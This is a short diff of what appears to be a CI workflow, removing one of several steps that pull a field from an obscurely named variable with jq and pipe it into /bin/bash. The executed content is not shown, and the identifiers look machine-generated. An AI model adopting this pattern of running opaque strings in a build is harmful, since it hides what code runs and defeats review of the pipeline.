@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$fmn2" | jq -r .cuoy11688 | /bin/bash
           printf '%s' "$skwrc06" | jq -r .n767 | /bin/bash
           echo $j49 | jq -r .zwue8007 | /bin/bash
-          printf '%s' "$vima81533" | jq -r .i81 | /bin/bash
           printf '%s' "$m41" | jq -r .ees05 | /bin/bash
 
       - name: Archive results
